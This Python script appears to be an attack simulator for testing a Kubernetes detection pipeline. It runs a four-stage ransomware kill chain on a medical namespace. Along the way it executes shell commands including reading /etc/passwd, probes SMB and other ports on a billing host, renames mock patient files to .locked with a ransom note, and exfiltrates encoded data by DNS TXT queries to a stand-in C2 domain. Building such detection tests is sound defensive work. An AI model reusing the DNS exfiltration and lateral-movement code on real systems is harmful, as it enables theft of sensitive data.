"""
SentinelCloud-Advanced: Multi-Stage Ransomware Attack Simulator
================================================================
This script simulates a realistic multi-stage ransomware kill chain
to test the SentinelCloud detection and remediation pipeline.

Stages:
  1. Initial Access      – shell execution (sys_execve /bin/sh)
  2. Lateral Movement    – SMB connection to billing service (port 445)
  3. Data Encryption     – rename files from .json to .locked
  4. Data Exfiltration   – DNS TXT queries with encoded data to C2 domain

Usage:
  # Run inside a compromised pod:
  python ransomware_simulator.py --target-namespace medical --billing-host billing.medical.svc.cluster.local

  # Run from outside, exec into a pod:
  kubectl exec -it <pod-name> -n medical -- python /tmp/ransomware_simulator.py

  # Run as a Kubernetes Job:
  kubectl apply -f attack-job.yaml
"""

import os
import sys
import json
import time
import socket
import struct
import random
import string
import logging
import argparse
import tempfile
import subprocess
from datetime import datetime, timezone
from pathlib import Path

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [ATTACK] %(message)s",
)
logger = logging.getLogger("ransomware-simulator")

try:
    sys.path.insert(0, os.path.join(os.path.dirname(__file__), "..", "..", "testing"))
    from safety import check_safety
except Exception:
    check_safety = None

# ---------------------------------------------------------------------------
# Configuration
# ---------------------------------------------------------------------------
DEFAULT_BILLING_HOST = "billing.medical.svc.cluster.local"
DEFAULT_BILLING_PORT = 445   # SMB port
DEFAULT_C2_DOMAIN = "evil-c2-server.example.com"
DEFAULT_FILE_COUNT = 100     # Number of files to encrypt
DEFAULT_DELAY_MS = 10        # Delay between file renames (ms)
EXFIL_CHUNK_SIZE = 63        # Max label length in DNS

# ---------------------------------------------------------------------------
# Attack Stages
# ---------------------------------------------------------------------------
class RansomwareSimulator:
    """Multi-stage ransomware attack simulator."""

    def __init__(self, args):
        self.billing_host = args.billing_host
        self.billing_port = args.billing_port
        self.c2_domain = args.c2_domain
        self.file_count = args.file_count
        self.delay_ms = args.delay_ms
        self.target_dir = args.target_dir or tempfile.mkdtemp(prefix="sentinel-attack-")
        self.timestamps = {}
        self.results = {}

    def record_timestamp(self, stage: str):
        """Record a timestamp for metrics."""
        self.timestamps[stage] = datetime.now(timezone.utc).isoformat()

    def stage_1_initial_access(self):
        """
        Stage 1: Initial Access – Execute a shell command.
        This triggers sys_execve detection by Tetragon.
        """
        logger.info("=" * 60)
        logger.info("STAGE 1: Initial Access – Shell Execution")
        logger.info("=" * 60)
        self.record_timestamp("stage_1_start")

        try:
            # Execute shell commands that should trigger sys_execve alerts
            commands = [
                ["/bin/sh", "-c", "echo 'SentinelCloud Attack Simulation'"],
                ["/bin/sh", "-c", "whoami"],
                ["/bin/sh", "-c", "id"],
                ["/bin/sh", "-c", "cat /etc/passwd | head -5"],
                ["/bin/sh", "-c", "ls -la /"],
                ["/bin/sh", "-c", "uname -a"],
            ]

            for cmd in commands:
                try:
                    result = subprocess.run(
                        cmd,
                        capture_output=True,
                        text=True,
                        timeout=5,
                    )
                    logger.info("  Executed: %s → exit=%d", " ".join(cmd), result.returncode)
                except (subprocess.TimeoutExpired, FileNotFoundError) as e:
                    logger.warning("  Command failed: %s", e)
                time.sleep(0.1)

        except Exception as e:
            logger.error("Stage 1 error: %s", e)

        self.record_timestamp("stage_1_end")
        self.results["stage_1"] = "completed"
        logger.info("Stage 1 complete.\n")

    def stage_2_lateral_movement(self):
        """
        Stage 2: Lateral Movement – Attempt SMB connection to billing service.
        This triggers sys_connect to port 445 detection.
        """
        logger.info("=" * 60)
        logger.info("STAGE 2: Lateral Movement – SMB Connection to Billing")
        logger.info("=" * 60)
        self.record_timestamp("stage_2_start")

        try:
            logger.info("  Attempting connection to %s:%d (SMB)", self.billing_host, self.billing_port)
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)

            try:
                sock.connect((self.billing_host, self.billing_port))
                logger.info("  SMB connection established (unexpected – port should be blocked)")
                # Send SMB negotiate protocol request (simplified)
                smb_header = b'\x00\x00\x00\x45'  # NetBIOS session header
                smb_header += b'\xff\x53\x4d\x42'  # SMB magic
                smb_header += b'\x72'               # Negotiate Protocol
                smb_header += b'\x00' * 64          # Padding
                sock.send(smb_header)
                self.results["stage_2"] = "connected"
            except (socket.timeout, ConnectionRefusedError, OSError) as e:
                logger.info("  SMB connection failed (expected – blocked by Cilium NP): %s", e)
                self.results["stage_2"] = "blocked"
            finally:
                sock.close()

            # Also try connecting on other suspicious ports
            for port in [4444, 8443, 9001]:
                try:
                    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                    s.settimeout(2)
                    s.connect((self.billing_host, port))
                    logger.info("  Connected to port %d", port)
                    s.close()
                except Exception:
                    logger.info("  Port %d blocked", port)

        except Exception as e:
            logger.error("Stage 2 error: %s", e)
            self.results["stage_2"] = f"error: {e}"

        self.record_timestamp("stage_2_end")
        logger.info("Stage 2 complete.\n")

    def stage_3_data_encryption(self):
        """
        Stage 3: Data Encryption – Create files and rename them to .locked.
        This triggers sys_rename detection with ransomware extension patterns.
        """
        logger.info("=" * 60)
        logger.info("STAGE 3: Data Encryption – File Rename (.json → .locked)")
        logger.info("=" * 60)
        self.record_timestamp("stage_3_start")

        encrypted_count = 0
        target_dir = Path(self.target_dir)
        target_dir.mkdir(parents=True, exist_ok=True)

        try:
            # Create mock patient data files
            logger.info("  Creating %d mock patient data files in %s", self.file_count, target_dir)
            for i in range(self.file_count):
                filename = f"patient_record_{i:04d}.json"
                filepath = target_dir / filename
                data = {
                    "patient_id": f"P{i:04d}",
                    "name": f"Patient {i}",
                    "diagnosis": random.choice(["hypertension", "diabetes", "cardiac"]),
                    "ssn": f"XXX-XX-{random.randint(1000, 9999)}",
                    "medications": ["aspirin", "metformin"],
                }
                filepath.write_text(json.dumps(data))

            # Now encrypt (rename) them
            logger.info("  Encrypting files (renaming to .locked)...")
            for filepath in sorted(target_dir.glob("*.json")):
                locked_path = filepath.with_suffix(".locked")
                filepath.rename(locked_path)
                encrypted_count += 1

                if encrypted_count % 20 == 0:
                    logger.info("  Encrypted %d/%d files", encrypted_count, self.file_count)

                if self.delay_ms > 0:
                    time.sleep(self.delay_ms / 1000.0)

            # Create a ransom note
            ransom_note = target_dir / "README_RANSOM.txt"
            ransom_note.write_text(
                "YOUR FILES HAVE BEEN ENCRYPTED!\n"
                "Send 10 BTC to wallet: 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n"
                "Contact: ransom@evil-c2-server.example.com\n"
                "--- SentinelCloud Attack Simulation ---\n"
            )

        except Exception as e:
            logger.error("Stage 3 error: %s", e)

        self.record_timestamp("stage_3_end")
        self.results["stage_3"] = f"encrypted {encrypted_count} files"
        logger.info("Stage 3 complete: %d files encrypted.\n", encrypted_count)

    def stage_4_data_exfiltration(self):
        """
        Stage 4: Data Exfiltration – Send DNS TXT queries with encoded data.
        This triggers DNSObelisk detection and DNS exfiltration alerts.
        """
        logger.info("=" * 60)
        logger.info("STAGE 4: Data Exfiltration – DNS TXT Queries")
        logger.info("=" * 60)
        self.record_timestamp("stage_4_start")

        exfil_data = "EXFIL:patient_records:ssn:XXX-XX-1234:diagnosis:cardiac:meds:aspirin,metformin"
        chunks_sent = 0

        try:
            # Encode data into DNS-safe format
            encoded = exfil_data.encode().hex()
            chunks = [encoded[i:i + EXFIL_CHUNK_SIZE]
                      for i in range(0, len(encoded), EXFIL_CHUNK_SIZE)]

            for i, chunk in enumerate(chunks):
                subdomain = f"{chunk}.{i}.data.{self.c2_domain}"
                logger.info("  DNS query [%d/%d]: %s", i + 1, len(chunks), subdomain[:60] + "...")

                try:
                    # Attempt DNS TXT query
                    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                    sock.settimeout(2)

                    # Build a minimal DNS query for TXT record
                    txn_id = random.randint(0, 65535)
                    flags = 0x0100  # standard query
                    questions = 1
                    header = struct.pack("!HHHHHH", txn_id, flags, questions, 0, 0, 0)

                    # Encode domain name
                    qname = b""
                    for label in subdomain.split("."):
                        qname += bytes([len(label)]) + label.encode()
                    qname += b"\x00"

                    # TXT record type (16), IN class (1)
                    query = header + qname + struct.pack("!HH", 16, 1)

                    # Send to system DNS resolver
                    try:
                        sock.sendto(query, ("8.8.8.8", 53))
                        chunks_sent += 1
                    except Exception:
                        pass
                    finally:
                        sock.close()

                except Exception as e:
                    logger.warning("  DNS exfil chunk %d failed: %s", i, e)

                time.sleep(0.05)

            # Also try using nslookup/dig if available
            try:
                subprocess.run(
                    ["nslookup", "-type=TXT", f"exfil.{self.c2_domain}"],
                    capture_output=True, timeout=3,
                )
            except Exception:
                pass

        except Exception as e:
            logger.error("Stage 4 error: %s", e)

        self.record_timestamp("stage_4_end")
        self.results["stage_4"] = f"sent {chunks_sent} DNS chunks"
        logger.info("Stage 4 complete: %d DNS chunks sent.\n", chunks_sent)

    def run_full_attack(self):
        """Execute all attack stages sequentially."""
        logger.info("#" * 60)
        logger.info("  SENTINELCLOUD RANSOMWARE ATTACK SIMULATION")
        logger.info("  Starting multi-stage kill chain...")
        logger.info("#" * 60)
        self.record_timestamp("attack_start")

        self.stage_1_initial_access()
        time.sleep(1)

        self.stage_2_lateral_movement()
        time.sleep(1)

        self.stage_3_data_encryption()
        time.sleep(1)

        self.stage_4_data_exfiltration()

        self.record_timestamp("attack_end")

        # Print summary
        logger.info("#" * 60)
        logger.info("  ATTACK SIMULATION COMPLETE")
        logger.info("#" * 60)
        logger.info("Timestamps:")
        for stage, ts in self.timestamps.items():
            logger.info("  %s: %s", stage, ts)
        logger.info("Results:")
        for stage, result in self.results.items():
            logger.info("  %s: %s", stage, result)

        # Write results to file for metrics collection
        results_file = Path(self.target_dir) / "attack_results.json"
        results_file.write_text(json.dumps({
            "timestamps": self.timestamps,
            "results": self.results,
            "config": {
                "billing_host": self.billing_host,
                "billing_port": self.billing_port,
                "c2_domain": self.c2_domain,
                "file_count": self.file_count,
            }
        }, indent=2))
        logger.info("Results written to %s", results_file)


# ---------------------------------------------------------------------------
# Entry Point
# ---------------------------------------------------------------------------
def main():
    parser = argparse.ArgumentParser(
        description="SentinelCloud-Advanced: Multi-Stage Ransomware Simulator"
    )
    parser.add_argument(
        "--billing-host", default=DEFAULT_BILLING_HOST,
        help="Billing service hostname (default: %(default)s)"
    )
    parser.add_argument(
        "--billing-port", type=int, default=DEFAULT_BILLING_PORT,
        help="SMB port to connect to (default: %(default)s)"
    )
    parser.add_argument(
        "--c2-domain", default=DEFAULT_C2_DOMAIN,
        help="C2 domain for DNS exfiltration (default: %(default)s)"
    )
    parser.add_argument(
        "--file-count", type=int, default=DEFAULT_FILE_COUNT,
        help="Number of files to encrypt (default: %(default)s)"
    )
    parser.add_argument(
        "--delay-ms", type=int, default=DEFAULT_DELAY_MS,
        help="Delay between file renames in ms (default: %(default)s)"
    )
    parser.add_argument(
        "--target-dir", default=None,
        help="Directory to create and encrypt files in (default: temp dir)"
    )
    parser.add_argument(
        "--stage", type=int, default=0,
        help="Run only a specific stage (1-4), 0 = all (default: 0)"
    )

    args = parser.parse_args()

    if check_safety and not check_safety(args.billing_host, args.billing_port):
        logger.error("Safety check failed for target %s:%d", args.billing_host, args.billing_port)
        sys.exit(1)

    sim = RansomwareSimulator(args)

    if args.stage == 0:
        sim.run_full_attack()
    elif args.stage == 1:
        sim.stage_1_initial_access()
    elif args.stage == 2:
        sim.stage_2_lateral_movement()
    elif args.stage == 3:
        sim.stage_3_data_encryption()
    elif args.stage == 4:
        sim.stage_4_data_exfiltration()
    else:
        logger.error("Invalid stage: %d (must be 0-4)", args.stage)
        sys.exit(1)


if __name__ == "__main__":
    main()
